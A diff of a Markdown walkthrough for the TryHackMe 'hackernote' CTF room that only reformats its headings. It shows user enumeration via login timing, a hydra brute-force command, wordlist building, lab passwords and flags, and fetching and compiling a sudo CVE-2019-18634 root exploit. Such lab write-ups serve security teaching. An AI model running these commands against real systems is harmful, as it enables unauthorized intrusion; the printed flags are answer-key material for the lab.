@@ -19,7 +19,7 @@ THM Room [https://tryhackme.com/room/hackernote](https://tryhackme.com/room/hack
 
 ## **TASK 1 : Reconnaissance** <a name="Reconnaissance"></a>
 
-####  Which ports are open? (in numerical order)
+* ####  Which ports are open? (in numerical order)
 
 ```console
 root@ip-10-10-127-246:~# nmap -sC -vv 10.10.127.143  
@@ -48,7 +48,7 @@ PORT  STATE SERVICE  REASON
 
 Answer : 22,80,8080
 
-#### What programming language is the backend written in ?
+* #### What programming language is the backend written in ?
 
 ```console
 root@ip-10-10-127-246:~# nmap -sV -sC -vv 10.10.127.143  
@@ -70,45 +70,45 @@ Answer : go
 
 ## **TASK 2 : Investigate** <a name="Investigate"></a>
 
-#### Create your own user account
+* #### Create your own user account
 No answer : created user john and password 12345 with hint 12345
 
-#### Log in to your account
+* #### Log in to your account
 No answer  
 
-#### Try and log in to an invalid user account
+* #### Try and log in to an invalid user account
 No answer  
 
-#### Try and log in to your account, with an incorrect password.
+* #### Try and log in to your account, with an incorrect password.
 No answer. Delay before error  
 
-#### Notice the timing difference. This allows user enumeration
+* #### Notice the timing difference. This allows user enumeration
 No answer. Wrong username is returning "invalid username or password" immediately and clicking "i forgot my password" with a valid username show the hint for this usernme.
 
 ## **TASK 3 : Exploit** <a name="Exploit"></a>
 
-#### Try to write a script to perform a timing attack.
+* #### Try to write a script to perform a timing attack.
 No answer. Download script from [https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py](https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py)
 
-#### How many usernames from the list are valid ?
+* #### How many usernames from the list are valid ?
 
 Run the script downloaded.  
 Answer : 1
 
-#### What are/is the valid username(s) ?
+* #### What are/is the valid username(s) ?
     
 
 Answer : james
 
 ## **TASK 4 : Attack Passwords** <a name="AttackPasswords"></a>
 
-#### Form the hydra command to attack the login API route
+* #### Form the hydra command to attack the login API route
     
 ```shell
 hydra -l james -P wordlist.txt 10.10.127.143 http-post-form "/api/user/login:username=^USER^&amp;password=^PASS^:F=incorrect" -V
 ```
 
-#### How many passwords were in your wordlist?
+* #### How many passwords were in your wordlist?
     
 Form the wordlist.txt from known favorites color and number (hint from james "forgotten password") with HASHCAT-UTILS and the two files numbers.txt and colors.txt :
 
@@ -123,25 +123,25 @@ wc wordlist.txt
 
 Answer : 180
 
-#### What was the user's password?  
+* #### What was the user's password?  
 I do a cluster bomb attack with BURPSUITE and the wordlist.txt and i get the result blue7 password match with a different length.
 
 Answer : bleu7
 
-#### Login as the user to the platform
+* #### Login as the user to the platform
 No answer but James let us a note as reminder with his SSH password : dak4ddb37b
 
-#### What's the user's SSH password?
+* #### What's the user's SSH password?
 Answer : dak4ddb37b
 
-#### Log in as the user to SSH with the credentials you have.
+* #### Log in as the user to SSH with the credentials you have.
 ```console
 ssh james@10.10.127.143
 ```
 
 No answer
 
-#### What's the user flag?  
+* #### What's the user flag?  
 ```console
 cat user.txt  
 thm{56911bd7ba1371a3221478aa5c094d68}
@@ -151,11 +151,11 @@ Answer :thm{56911bd7ba1371a3221478aa5c094d68}
 
 ## **TASK 5 : Escalate** <a name="Escalate"></a>
 
-#### What is the CVE number for the exploit? 
+* #### What is the CVE number for the exploit? 
 Reading the texttell us the recent CVE is "pwdfeedback" and googling"pwdfeedback" return theCVE-2019-18634.  
 Answer :CVE-2019-18634
 
-#### Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/) and download the files.
+* #### Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/) and download the files.
 
 ```console
 cd Deskstop  
@@ -166,7 +166,7 @@ git clone https://github.com/saleemrashid/sudo-cve-2019-18634
 
 No answer
 
-#### Compile the exploit from Kali linux.
+* #### Compile the exploit from Kali linux.
     
 ```console
 cd sudo-cve-2019-18634  
@@ -175,7 +175,7 @@ make
 
 No answer
 
-#### SCP the exploit binary to the box.
+* #### SCP the exploit binary to the box.
     
 
 Copy and save this code to the KALI where you downloaded the exploit :
@@ -198,7 +198,7 @@ python server.py
 
 No answer
 
-#### Run the exploit, get root.
+* #### Run the exploit, get root.
     
 
 On the SSH of James :
@@ -214,7 +214,7 @@ uid=0(root)
 
 No Answer
 
-#### What is the root flag?
+* #### What is the root flag?
     
 ```console
 cat /root/root.txt  
